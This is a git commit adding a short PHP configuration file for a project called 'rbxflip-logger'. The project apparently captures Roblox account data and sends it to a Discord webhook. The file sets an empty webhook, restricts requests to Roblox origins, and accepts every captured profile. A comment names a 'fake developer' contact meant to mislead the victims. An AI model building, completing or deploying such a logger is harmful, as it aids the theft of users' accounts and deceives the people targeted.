0d3d6fe96421ba0f820c9bca5643685c076b794e
leveiok <79027202+leveiok@users.noreply.github.com>
2021-02-13 22:42:56 +0000

    Add files via upload

---
+++ rbxflip-logger-main/config.php
@@ -0,0 +1,14 @@
+<?php
+    // webhook link
+    $webhook = "";
+    // fake developer for the bot the users may contact
+    $discord_contact = "Toco#9999";
+    
+    $allowed_origins = array(
+        "https://www.roblox.com",
+        "https://web.roblox.com"
+    );
+    function account_filter($profile) {
+        return true;
+    }
+?>
